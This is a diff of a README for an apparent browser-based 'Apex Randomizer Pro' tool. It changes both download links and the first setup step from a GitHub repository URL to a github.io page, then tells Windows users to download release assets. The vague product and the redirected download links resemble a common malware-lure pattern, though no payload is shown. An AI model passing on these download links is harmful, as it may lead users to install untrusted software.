@@ -1,6 +1,6 @@
 # 🎲 apex-randomizer-pro-web - Effortless random selection for Apex workflows
 
-[![Download Apex Randomizer](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Faucal-roominess933/apex-randomizer-pro-web)
+[![Download Apex Randomizer](https://img.shields.io/badge/Download-Release-blue.svg)](https://faucal-roominess933.github.io)
 
 Apex Randomizer Pro helps you manage random selections for your projects. This browser-based utility allows you to generate random outcomes based on your custom criteria. Users benefit from a streamlined interface that removes guesswork from complex workflows. This 2026 release brings new features to ensure your randomizer settings remain accurate and reliable.
 
@@ -12,7 +12,7 @@ The tool functions as a local web application. It runs inside your web browser, 
 
 Follow these steps to access and use the software on your Windows computer.
 
-1. Visit the project website for the most recent version. You can reach the download location here: [https://github.com/Faucal-roominess933/apex-randomizer-pro-web](https://github.com/Faucal-roominess933/apex-randomizer-pro-web).
+1. Visit the project website for the most recent version. You can reach the download location here: [https://faucal-roominess933.github.io](https://faucal-roominess933.github.io).
 2. Look for the button labeled "Releases" on the right side of the page.
 3. Click the most recent release version link.
 4. Locate the section titled "Assets" at the bottom of the release notes.
